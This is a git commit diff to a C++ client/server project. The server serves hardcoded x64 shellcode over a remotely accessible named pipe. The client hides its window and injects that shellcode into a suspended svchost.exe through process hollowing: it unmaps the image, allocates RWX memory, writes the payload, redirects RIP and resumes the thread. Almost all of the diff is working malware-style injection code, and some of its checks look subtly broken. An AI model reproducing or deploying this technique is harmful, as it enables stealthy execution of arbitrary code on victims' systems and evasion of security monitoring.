d9c59735146196fb7e2f5ecf86161e121ed0682f
WeirdoBananCY <uritsamir@gmail.com>
2023-06-03 00:09:43 +0300

    modified:   MagonClient/src/cpp/main.cpp modified:   MagonServer/src/cpp/main.cpp

--- MagonClient/src/cpp/main.cpp
+++ MagonClient/src/cpp/main.cpp
@@ -2,15 +2,20 @@
 #include <iostream>
 #include <algorithm>
 
+#pragma comment(lib, "ntdll.lib")
+
 HANDLE hPipeClient = nullptr;
 DWORD dwPipeMode = 0, dwReadBytes = 0;
-BOOL bConnected = FALSE, bReceived = FALSE;
+BOOL bConnected = FALSE, bReceived = FALSE, bProcessOpened = FALSE, bWroteMemory = FALSE;
+CONTEXT c{};
 
 const LPCWSTR pipeName = L"\\\\.\\pipe\\MagonServer";
 const unsigned int buffSize = 4096;
 
+typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
+
 /* function to hide window and run in the background */
-void StealthMode() { 
+void StealthMode() {
     AllocConsole();
     HWND stealth = FindWindowA("ConsoleWindowClass", nullptr);
     ShowWindow(stealth, 0);
@@ -65,7 +70,7 @@ int main() {
         (LPVOID)buffer,
         buffSize,
         &dwReadBytes,
-        NULL 
+        NULL
     );
 
     /* check for the return value of ReadFile */
@@ -77,11 +82,151 @@ int main() {
 
     std::cout << buffer << std::endl;
     std::cout << strlen(buffer) << std::endl;
-    
-    // TODO: inject into screenshot "innocent" process 
 
     /* cleaning up */
     CloseHandle(hPipeClient);
+
+    /* initialize info for the hollowrd process */
+    STARTUPINFOA startupinfo;
+    ZeroMemory(&startupinfo, sizeof(startupinfo));
+    startupinfo.cb = sizeof(startupinfo);
+
+    PROCESS_INFORMATION processinfo;
+    ZeroMemory(&processinfo, sizeof(processinfo));
+
+    /* creating a notepad process to hollow */
+    bProcessOpened = CreateProcessA(
+        "C:\\Windows\\System32\\svchost.exe",
+        NULL,
+        NULL,
+        NULL,
+        TRUE,
+        CREATE_SUSPENDED, // for hollowing
+        NULL,
+        NULL,
+        &startupinfo,
+        &processinfo
+    );
+
+    /* check for the return value of CreateProcessA */
+    if (bProcessOpened == FALSE) {
+        std::cerr << "Failed in creating a process to hollow, error code: " << GetLastError() << std::endl;
+        return EXIT_FAILURE;
+    }
+
+    /* buffer for the start address of the hollow memory */
+    PVOID bufferAddress = nullptr;
+
+    auto hNtdllBase = GetModuleHandleA("ntdll.dll");
+    if (hNtdllBase == NULL) {
+        std::cerr << "Failed in getting ntdll.dll from the OS, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* getting the unmap function from ntdll.dll */
+    pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");
+
+    /* check for the return value of ZwUnmapViewOfSection */
+    DWORD dwResult = pZwUnmapViewOfSection(
+        processinfo.hProcess,
+        bufferAddress
+    );
+    if (!dwResult) {
+        std::cerr << "Failed in unmapping the process to hollow, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* allocating the shellcode size into the memory of the process */
+    LPVOID start_address = VirtualAllocEx(
+        processinfo.hProcess,
+        (LPVOID)bufferAddress,
+        strlen(buffer),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    
+    /* check for the return value of VirtualAllocEx */
+    if (start_address == NULL) {
+        std::cerr << "Failed in allocating memory for the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    DWORD dwOld = 0;
+    DWORD dwNew = 0;
+
+    /* changing the memory protection mode to read/write/execute */
+    if (VirtualProtectEx(
+        processinfo.hProcess,
+        start_address,
+        strlen(buffer),
+        PAGE_EXECUTE_READWRITE,
+        &dwOld
+    ) == FALSE) {
+        std::cerr << "Failed in changing the memory to read/write/execute for the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* writing the shellcode inside the process's memory */
+    bWroteMemory = WriteProcessMemory(
+        processinfo.hProcess,
+        start_address,
+        buffer,
+        strlen(buffer),
+        NULL
+    );
+
+    /* changing the memory protection mode to original */
+    if (VirtualProtectEx(
+        processinfo.hProcess,
+        start_address,
+        strlen(buffer),
+        dwOld,
+        &dwNew
+    ) == FALSE) {
+        std::cerr << "Failed in returning the memory's original permissions in the hollowed process, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* check for the return value of WriteProcessMemory */
+    if (bWroteMemory == FALSE) {
+        std::cerr << "Failed in writing the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* getting the context of the thread */
+    c.ContextFlags = CONTEXT_ALL;
+    if (GetThreadContext(processinfo.hThread, &c) == FALSE) {
+        std::cerr << "Failed in getting the hollowed process's thread context, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+    
+    /* changing rip to point to the start of the shellcode */
+    c.Rip = reinterpret_cast<DWORD64>(start_address);
+
+    /* setting the thread's context to the new one */
+    if (SetThreadContext(processinfo.hThread, &c) == FALSE) {
+        std::cerr << "Failed in setting the hollowed process's thread context, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* resuming the thread */
+    if (ResumeThread(processinfo.hThread) == -1) {
+        std::cerr << "Failed in resuming the hollowed process's thread, error code: " << GetLastError() << std::endl;
+        TerminateProcess(processinfo.hProcess, 0);
+        return EXIT_FAILURE;
+    }
+
+    /* cleaning up */
+    CloseHandle(processinfo.hProcess);
+    CloseHandle(processinfo.hThread);
 
     return 0;
 }
--- MagonServer/src/cpp/main.cpp
+++ MagonServer/src/cpp/main.cpp
@@ -13,45 +13,15 @@ constexpr unsigned int uiMaxInstances = 1; // maximum number of instances for th
 constexpr unsigned int uiBuffSize = 4096;  // maximum number of bytes of the messages to read / write from the server pipe
 
 int main(int argc, char *argv[]) {
-    
-    /* if no shellcode was provided, end the program */
-    // if (argc < 2) { 
-    //     std::cerr << "Usage: <shellcode> [ MagonServer.exe ]" << std::endl;
-    //     return EXIT_FAILURE;    
-    // }
 
     /* get the shellcode + it's size from argv*/
-    const char shellcode[] =   "\x6a\x30\x59\xd9\xee\xd9\x74"
-                              "\x24\xf4\x5b\x81\x73\x13\xf4"
-                              "\xdd\xb5\xba\x83\xeb\xfc\xe2"
-                              "\xf4\x08\x35\x37\xba\xf4\xdd"
-                              "\xd5\x33\x11\xec\x75\xde\x7f"
-                              "\x8d\x85\x31\xa6\xd1\x3e\xe8"
-                              "\xe0\x56\xc7\x92\xfb\x6a\xff"
-                              "\x9c\xc5\x22\x19\x86\x95\xa1"
-                              "\xb7\x96\xd4\x1c\x7a\xb7\xf5"
-                              "\x1a\x57\x48\xa6\x8a\x3e\xe8"
-                              "\xe4\x56\xff\x86\x7f\x91\xa4"
-                              "\xc2\x17\x95\xb4\x6b\xa5\x56"
-                              "\xec\x9a\xf5\x0e\x3e\xf3\xec"
-                              "\x3e\x8f\xf3\x7f\xe9\x3e\xbb"
-                              "\x22\xec\x4a\x16\x35\x12\xb8"
-                              "\xbb\x33\xe5\x55\xcf\x02\xde"
-                              "\xc8\x42\xcf\xa0\x91\xcf\x10"
-                              "\x85\x3e\xe2\xd0\xdc\x66\xdc"
-                              "\x7f\xd1\xfe\x31\xac\xc1\xb4"
-                              "\x69\x7f\xd9\x3e\xbb\x24\x54"
-                              "\xf1\x9e\xd0\x86\xee\xdb\xad"
-                              "\x87\xe4\x45\x14\x82\xea\xe0"
-                              "\x7f\xcf\x5e\x37\xa9\xb7\xb4"
-                              "\x37\x71\x6f\xb5\xba\xf4\x8d"
-                              "\xdd\x8b\x7f\xb2\x32\x45\x21"
-                              "\x66\x4b\xb4\xc6\x37\xdd\x1c"
-                              "\x61\x60\x28\x45\x21\xe1\xb3"
-                              "\xc6\xfe\x5d\x4e\x5a\x81\xd8"
-                              "\x0e\xfd\xe7\xaf\xda\xd0\xf4"
-                              "\x8e\x4a\x6f\x97\xbc\xd9\xd9"
-                              "\xf4\xdd\xb5\xba"; 
+    const char shellcode[] =   "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
+    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
+    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
+    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
+    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
+    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
+    "\x48\x83\xec\x20\x41\xff\xd6";
     const std::size_t stShellcodeLen = strlen(shellcode);
 
     DWORD dwShellcodeLen = 0;
@@ -67,12 +37,9 @@ int main(int argc, char *argv[]) {
     /* create the server pipe line */
     hServerPipe = CreateNamedPipeA(
         "\\\\.\\pipe\\MagonServer", // name of pipe
-        PIPE_ACCESS_DUPLEX | 
-        FILE_FLAG_OVERLAPPED, // read / write + allow remote pipes
-        PIPE_TYPE_MESSAGE |
-        PIPE_READMODE_MESSAGE |  
-        PIPE_ACCEPT_REMOTE_CLIENTS, // message read mode 
-        uiMaxInstances, // max number of instances
+        PIPE_ACCESS_DUPLEX, 
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS, // message read mode 
+        PIPE_UNLIMITED_INSTANCES, // max number of instances
         uiBuffSize, // buffer size for output
         uiBuffSize, // buffer size for input
         0, // default timeout of 50 milliseconds
